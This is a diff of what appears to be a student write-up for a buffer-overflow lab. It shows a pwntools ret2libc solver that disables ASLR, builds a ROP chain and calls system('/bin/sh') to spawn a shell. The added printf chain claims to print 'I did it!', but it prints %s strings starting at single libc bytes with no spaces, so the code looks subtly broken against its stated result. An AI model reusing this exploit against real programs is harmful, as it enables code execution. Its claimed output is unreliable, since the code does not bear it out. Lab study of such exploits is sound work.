@@ -30,7 +30,9 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 so our libc base address we got is : `0xf7d8b000`
 
 we will use system function in the lab9 binary present to call '/bin/sh' from libc as addresses are static wont be an issue
+& will print "I did it!"
 
+`solver.py`
 ```py
 import sys
 from pwn import *
@@ -41,28 +43,47 @@ context.arch = 'i386'
 binary = ELF("lab9")
 libc = ELF("/usr/lib32/libc.so.6")
 
-libc_base = 0xf7d8b000
+libc_base = 0xf7d66000
 system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+I_addr = libc_base + next(libc.search(b'I'))
+d_addr = libc_base + next(libc.search(b'd'))
+i_addr = libc_base + next(libc.search(b'i'))
+t_addr = libc_base + next(libc.search(b'T'))
+exclamation_addr = libc_base + next(libc.search(b'!'))
+
+format_string = libc_base + next(libc.search(b'%s'))
 
 rop = ROP(binary)
 
+rop.call("printf", [format_string, I_addr])
+rop.call("printf", [format_string, d_addr])
+rop.call("printf", [format_string, i_addr])
+rop.call("printf", [format_string, d_addr])
+rop.call("printf", [format_string, i_addr])
+rop.call("printf", [format_string, t_addr])
+rop.call("printf", [format_string, exclamation_addr])
 
-bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
 rop.call(system_addr, [bin_sh_addr])
 
 padding = b"a" * 22
 exploit = rop.chain()
-payload = padding + exploit + b"bbbb"  # 4 extra b's for padding adjustment here
+payload = padding + exploit
+
 sys.stdout.buffer.write(payload)
 ```
 
-### Run it
-
-```bash
-./lab9 $(python3 solve.py)
 ```
+./lab9 $(python3 solver.py)
+```
+![image](https://gist.github.com/user-attachments/assets/1c6f15b4-93d0-4cca-8da3-c1af28b58b22)
 
-![image](https://github.com/user-attachments/assets/c8763b16-1a49-4f4b-a91e-a45ed31398c7)
+
+
+
+
+
 
 
 ## Ret2Shellcode Way Solution
